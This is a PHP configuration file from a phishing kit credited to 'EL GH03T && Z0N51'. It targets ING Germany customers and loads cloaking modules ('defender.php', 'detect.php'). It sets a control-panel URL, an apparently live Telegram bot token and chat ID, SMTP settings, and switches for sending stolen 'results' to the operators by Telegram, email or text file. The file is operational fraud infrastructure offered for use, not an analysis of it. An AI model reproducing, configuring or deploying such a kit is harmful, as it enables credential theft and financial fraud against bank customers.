<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    session_start();
    error_reporting(0);
    require_once 'defender.php';
    require_once 'detect.php';
    require_once 'functions.php';
    require_once 'panel.php';
    define("PASSWORD", 'in');
    define("PANEL", 'https://miw.one/vendor/bootstrap/css/baz/panel/');
    define("RECEIVER", 'your@email.com');
    define("TELEGRAM_TOKEN", '5621907662:AAHSGgNSgFdutQ4_VLYuEnKt3IX8N3NqohI');
    define("TELEGRAM_CHAT_ID", '-841928412');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'my_result002.txt');
    define("OFFICIAL_WEBSITE", 'https://www.ing.de/');

    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>
